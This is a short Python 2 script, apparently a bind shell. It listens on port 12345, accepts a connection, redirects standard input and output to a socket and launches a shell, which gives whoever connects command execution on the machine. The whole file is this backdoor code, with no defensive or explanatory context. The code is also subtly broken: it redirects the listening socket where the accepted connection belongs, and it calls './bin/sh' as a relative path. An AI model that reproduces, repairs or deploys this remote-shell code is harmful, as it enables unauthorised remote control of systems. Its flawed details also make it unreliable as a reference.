import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#s=socket.socket()
host = socket.gethostname()
port = 12345
s.bind((host,port))
s.listen(5)
c, addr = s.accept()
print 'Got connection from', addr
c.send('connected')
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["./bin/sh"])
